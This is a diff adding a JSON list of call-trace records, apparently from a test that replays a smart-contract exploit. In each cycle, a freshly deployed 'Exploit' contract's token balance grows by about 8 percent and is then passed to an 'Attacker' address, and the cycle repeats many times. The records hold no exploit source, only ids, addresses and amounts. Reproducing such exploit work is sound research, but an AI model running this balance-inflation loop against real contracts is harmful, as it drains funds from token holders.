+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "14039683434043067238304866 [1.403e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9], 1168101661712383194226964 [1.168e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x15cF58144EF33af1e14b5208015d11F9143E27b9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "15207785095755450432531830 [1.52e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 15207785095755450432531830 [1.52e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "15207785095755450432531830 [1.52e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 15207785095755450432531830 [1.52e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]",
+        "original_code": null,
+        "description": null,
+        "return_value": "15207785095755450432531829 [1.52e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C], 1265287719966853475986648 [1.265e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x212224D2F2d262cd093eE13240ca4873fcCBbA3C]",
+        "original_code": null,
+        "description": null,
+        "return_value": "16473072815722303908518477 [1.647e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 16473072815722303908518477 [1.647e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "16473072815722303908518477 [1.647e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3], 16473072815722303908518477 [1.647e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3]",
+        "original_code": null,
+        "description": null,
+        "return_value": "16473072815722303908518476 [1.647e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3], 1370559658268095685188737 [1.37e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x2a07706473244BC757E10F2a9E86fB532828afe3]",
+        "original_code": null,
+        "description": null,
+        "return_value": "17843632473990399593707213 [1.784e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17843632473990399593707213 [1.784e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "17843632473990399593707213 [1.784e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], 17843632473990399593707213 [1.784e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "17843632473990399593707212 [1.784e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7], 1484590221836001246196440 [1.484e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3D7Ebc40AF7092E3F1C81F2e996cbA5Cae2090d7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "19328222695826400839903652 [1.932e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 19328222695826400839903652 [1.932e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "19328222695826400839903652 [1.932e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], 19328222695826400839903652 [1.932e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]",
+        "original_code": null,
+        "description": null,
+        "return_value": "19328222695826400839903651 [1.932e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70], 1608108128292756549879983 [1.608e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xD16d567549A2a2a2005aEACf7fB193851603dd70]",
+        "original_code": null,
+        "description": null,
+        "return_value": "20936330824119157389783634 [2.093e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20936330824119157389783634 [2.093e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "20936330824119157389783634 [2.093e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], 20936330824119157389783634 [2.093e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758]",
+        "original_code": null,
+        "description": null,
+        "return_value": "20936330824119157389783633 [2.093e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758], 1741902724566713894829998 [1.741e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x96d3F6c20EEd2697647F543fE6C08bC2Fbf39758]",
+        "original_code": null,
+        "description": null,
+        "return_value": "22678233548685871284613631 [2.267e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22678233548685871284613631 [2.267e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "22678233548685871284613631 [2.267e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 22678233548685871284613631 [2.267e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "22678233548685871284613630 [2.267e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7], 1886829031250664490879854 [1.886e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x13aa49bAc059d709dd0a18D6bb63290076a702D7]",
+        "original_code": null,
+        "description": null,
+        "return_value": "24565062579936535775493484 [2.456e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 24565062579936535775493484 [2.456e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "24565062579936535775493484 [2.456e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], 24565062579936535775493484 [2.456e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240]",
+        "original_code": null,
+        "description": null,
+        "return_value": "24565062579936535775493483 [2.456e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240], 2043813206650719776521057 [2.043e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xDB25A7b768311dE128BBDa7B8426c3f9C74f3240]",
+        "original_code": null,
+        "description": null,
+        "return_value": "26608875786587255552014540 [2.66e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 26608875786587255552014540 [2.66e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "26608875786587255552014540 [2.66e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], 26608875786587255552014540 [2.66e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f]",
+        "original_code": null,
+        "description": null,
+        "return_value": "26608875786587255552014539 [2.66e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f], 2213858465444059661927609 [2.213e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3381cD18e2Fb4dB236BF0525938AB6E43Db0440f]",
+        "original_code": null,
+        "description": null,
+        "return_value": "28822734252031315213942148 [2.882e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 28822734252031315213942148 [2.882e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "28822734252031315213942148 [2.882e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B], 28822734252031315213942148 [2.882e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "28822734252031315213942147 [2.882e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B], 2398051489769005425799986 [2.398e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x756e0562323ADcDA4430d6cb456d9151f605290B]",
+        "original_code": null,
+        "description": null,
+        "return_value": "31220785741800320639742133 [3.122e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 31220785741800320639742133 [3.122e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "31220785741800320639742133 [3.122e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], 31220785741800320639742133 [3.122e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "31220785741800320639742132 [3.122e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6], 2597569373717786677226545 [2.597e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x1aF7f588A501EA2B5bB3feeFA744892aA2CF00e6]",
+        "original_code": null,
+        "description": null,
+        "return_value": "33818355115518107316968677 [3.381e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33818355115518107316968677 [3.381e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "33818355115518107316968677 [3.381e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], 33818355115518107316968677 [3.381e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840]",
+        "original_code": null,
+        "description": null,
+        "return_value": "33818355115518107316968676 [3.381e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840], 2813687145611106528771793 [2.813e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xe8dc788818033232EF9772CB2e6622F1Ec8bc840]",
+        "original_code": null,
+        "description": null,
+        "return_value": "36632042261129213845740469 [3.663e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 36632042261129213845740469 [3.663e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "36632042261129213845740469 [3.663e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], 36632042261129213845740469 [3.663e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E]",
+        "original_code": null,
+        "description": null,
+        "return_value": "36632042261129213845740468 [3.663e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E], 3047785916125950591965606 [3.047e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x3Cff5E7eBecb676c3Cb602D0ef2d46710b88854E]",
+        "original_code": null,
+        "description": null,
+        "return_value": "39679828177255164437706074 [3.967e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 39679828177255164437706074 [3.967e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "39679828177255164437706074 [3.967e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], 39679828177255164437706074 [3.967e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da]",
+        "original_code": null,
+        "description": null,
+        "return_value": "39679828177255164437706073 [3.967e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da], 3301361704347629681217145 [3.301e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x27cc01A4676C73fe8b6d0933Ac991BfF1D77C4da]",
+        "original_code": null,
+        "description": null,
+        "return_value": "42981189881602794118923218 [4.298e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 42981189881602794118923218 [4.298e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "42981189881602794118923218 [4.298e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C], 42981189881602794118923218 [4.298e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C]",
+        "original_code": null,
+        "description": null,
+        "return_value": "42981189881602794118923217 [4.298e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C], 3576034998149352470694411 [3.576e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x796f2974e3C1af763252512dd6d521E9E984726C]",
+        "original_code": null,
+        "description": null,
+        "return_value": "46557224879752146589617628 [4.655e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 46557224879752146589617628 [4.655e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "46557224879752146589617628 [4.655e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], 46557224879752146589617628 [4.655e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "46557224879752146589617627 [4.655e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1], 3873561109995378596256186 [3.873e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x92a6649Fdcc044DA968d94202465578a9371C7b1]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50430785989747525185873813 [5.043e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 50430785989747525185873813 [5.043e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50430785989747525185873813 [5.043e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], 50430785989747525185873813 [5.043e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d]",
+        "original_code": null,
+        "description": null,
+        "return_value": "50430785989747525185873812 [5.043e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d], 4195841394346994095464701 [4.195e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0xDA5A5ADC64C8013d334A0DA9e711B364Af7A4C2d]",
+        "original_code": null,
+        "description": null,
+        "return_value": "54626627384094519281338513 [5.462e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 54626627384094519281338513 [5.462e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "6481 bytes of code"
+    },
+    {
+        "id": "2855",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "54626627384094519281338513 [5.462e25]"
+    },
+    {
+        "id": "79852",
+        "args": "Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], 54626627384094519281338513 [5.462e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "55352",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "39161",
+        "args": "00000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d]",
+        "original_code": null,
+        "description": null,
+        "return_value": "54626627384094519281338512 [5.462e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d], 4544935398356664004207364 [4.544e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2855",
+        "args": "Exploit: [0x886D6d1eB8D415b00052828CD6d5B321f072073d]",
+        "original_code": null,
+        "description": null,
+        "return_value": "59171562782451183285545876 [5.917e25]"
+    },
+    {
+        "id": "10844",
+        "args": "Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 59171562782451183285545876 [5.917e25]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "1341879",
+        "args": "",
